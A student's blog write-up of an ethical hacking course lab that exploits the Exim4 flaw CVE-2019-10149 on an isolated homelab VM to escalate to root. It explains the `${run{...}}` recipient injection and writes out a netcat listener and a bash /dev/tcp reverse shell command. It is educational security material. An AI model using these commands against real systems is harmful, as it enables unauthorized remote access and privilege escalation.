---
title: 'Ethical Hacking Challenge'
description: 'Exploiting CVE-2019-10149'
keywords: 'CVE-2019-10149, Local Privilege Escalation, nmap, netcat, Proxmox'
pubDate: 'Oct 3 2026'
updatedDate: 'Oct 3 2026'
---

## The Assignment
My first major assignment for *CIS 474 - Ethical Hacking* at Messiah was titled "The Hacking Challenge". My task was simple: demonstrate a full attack chain, from reconnaissance to exploitation, on a vulnerable virtual machine (VM) of my choice. With the project being open-ended, I volunteered to find an entry in the National Vulnerability Database (NVD) that was both interesting to me and also held some difficulty. After searching through potential exploits, I found CVE-2019-10149 and followed through with the entire exploit chain, utilizing my homelab environment for the VMs and creating a PowerPoint presentation detailing the exploitation process.

## What is CVE-2019-10149?
CVE-2019-10149 is a critical security vulnerability present within Exim4 versions 4.87-4.91 that, when exploited, can result in privilege escalation and potentially remote command execution. Exim4 is a widely-used mail transfer agent, responsible for receiving and forwarding emails to different servers or clients on the network where it lives. This exploit takes advantage of a new function used to parse the recipient address, `expand_string()`, which accepts input without proper data sanitization. This means that when an attacker send an artificial mail packet with a recipient address formatted as `${run{...}}`, the string expansion can trick the Exim4 server into running the command(s) within the {}. The vulnerability is critical because the Exim4 process runs with root privileges; therefore, any commands run within this string expansion will be run with the highest privileges possible, allowing for further exploitation through reverse shells, data exfiltration, or system compromise. This vulnerability was patched with Exim4 version 4.92; however, it has been exploited in the wild following its discovery in 2019.

## Exploit Process
For this project, I was unable to get the remote version of the exploit working. However, I have properly demonstrated how the exploit could be used locally. The only assumption is that initial access has already been gained to the victim machine. This could be established through phishing, malware, or other exploits that grant an attacker an initial shell as the victim's user on the victim machine.

---

### Step 0: Lab Setup
To begin this demo, I created three virtual machines on my homelab infrastructure. I routed all three virtual machines using a network bridge, maintaining isolation from my home network while providing internet access for setup and installing required tools. Here is a short description of all three machines:
1. pfSense VM
    - Utilized to isolate virtual machines from the rest of my homelab.
2. Debian 9 VM
    - Installed Exim4 version 4.89 using outdated Debian packages.
    - No further configurations required to exploit. 
3. Kali Linux VM
    - Utilized as the "attacker" VM.

### Step 1: Reconnaissance

![nmap output](/images/EH-nmap.png)

To demonstrate this step of the chain, I utilized nmap to scan the victim machine and determine that the vulnerable version of Exim4 was running. The screenshot on the left shows the nmap output, verifying that a vulnerable version of Exim4 is running on the victim machine at port 25.

### Step 2: Initial Access

![reverse shell](/images/EH-shell.png)

As mentioned, initial access is assumed for the local exploitation of this vulnerability. I established that initial access using a simple reverse shell, a command run on the victim machine as the low-level user *john* that sends shell input and output to the attacker machine at a specific port. This allows the attacker, who is listening on that port, to send and receive commands as the user *john* on the victim machine, despite being on the attacking machine as demonstrated in the left image. Below are the commands I utilized:

- Attacker Machine: `nc -lvnp 4444`
    - Starting a listening process at port 4444, waiting for incoming connection from the victim machine.
- Victim Machine: `bash -i >& /dev/tcp/192.168.1.101/4444 0>&1`
    - Sending the shell (bash) input and output to the attacker's IP at port 4444, which the attacker is listening on.

### Step 3: The Script
Now that I have access to run commands as the low-level user *john*, I can build the script that will be used to exploit this vulnerability. To summarize, the script creates an email with the receiver address including a command to create a new reverse shell within the `${run{...}}` string expansion. This email is then sent to the victim machine locally, and the email server processes and runs the command as the *root* user, creating a new reverse shell. The script then waits until the shell is established, then attaches to that shell and provides the attacker input and output to the new *root* shell.

### Step 4: Exploitation

![root access](/images/EH-whoami.png)

Once the script has been placed on the victim machine, execute permissions are added and the script can be run. As the script runs, the attacker sees that their shell changes from *john@victim* to *root@victim*, confirming that the exploit successfully worked. Root-level access can be further verified using commands such as `id` or `whoami`, which show the shell running as the root user.

### Step 5: Post-Exploit

![flag output](/images/EH-flag.png)

After the exploit was accomplished, I searched the *root* user's home directory to find **flag.txt**, a file that can only be read by the *root* user. To verify that I had successfully exploited the machine, I ran the command `cat flag.txt` and was able to see the contents of the flag, which I would only be able to see as the *root* user. 

From here, if I was an unethical hacker, I could cause complete chaos on this system. I could exfiltrate emails, establish persistence, laterally move throughout the network, or fully compromise the machine. This exploit goes undetected unless log files are being monitored, so I could be in this system for an extended amount of time without detection.

---

## What did I learn?
This project was my first challenge oriented around Ethical Hacking. Because of this, I walked away learning much more than I anticipated:
- The attacker kill chain and the steps of performing a cyberattack.
- How to navigate the National Vulnerability Database (NVD) and read through entries.
- How to create a reverse shell using netcat.
- The importance of proper data sanitization in input fields.
- More experience with Proxmox networking and pfSense initial configuration.